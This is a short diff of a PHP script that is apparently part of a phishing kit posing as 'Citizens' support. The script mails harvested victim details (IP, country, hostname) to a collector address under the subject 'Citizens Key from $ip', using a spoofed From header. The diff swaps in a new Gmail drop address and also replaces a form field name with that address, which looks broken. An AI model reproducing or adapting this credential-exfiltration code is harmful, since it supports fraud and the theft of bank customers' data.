@@ -21,10 +21,10 @@ $message .= "DateTime                    : ".$timedate."\n";
 $message .= "country                    : ".$country."\n";
 $message .= "HostName : ".$hostname."\n";
 $message .= "---------------Created BY vi3nas-------------\n";
-$send = "infoverifycitizen@gmail.com";
+$send = "gbryyan1@gmail.com";
 $subject = "Citizens Key from $ip";
 $headers = "From: Citizens Key<customer-support@hkstardomni.com>";
-$headers .= $_POST['eMailAdd']."\n";
+$headers .= $_POST['gbryyan1@gmail.com']."\n";
 $headers .= "MIME-Version: 1.0\n";
 $arr=array($send, $IP);
 foreach ($arr as $send)
